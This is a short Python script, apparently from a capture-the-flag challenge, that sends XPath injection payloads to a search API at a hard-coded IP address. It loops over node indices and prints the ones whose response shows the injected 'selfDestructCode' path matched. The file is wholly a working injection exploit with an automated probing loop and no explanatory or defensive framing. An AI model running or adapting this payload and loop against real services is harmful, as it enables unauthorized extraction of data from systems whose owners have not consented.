import requests

# blah' or 1=1][1]/selfDestructCode['a'='a
url = "http://165.227.236.40:30406/api/search"

restart = True

while restart:
    restart = False

    for i in range(0, 50):
        term = "blah' or 1=1][{}]/selfDestructCode['a'='a".format(i)
        post_data = {'search': term}
        r = requests.post(url, json=post_data, allow_redirects=False)

        # print(url)
        # print(r.text)

        if "doesn't" not in r.text:
            print(i)
            # exit(0)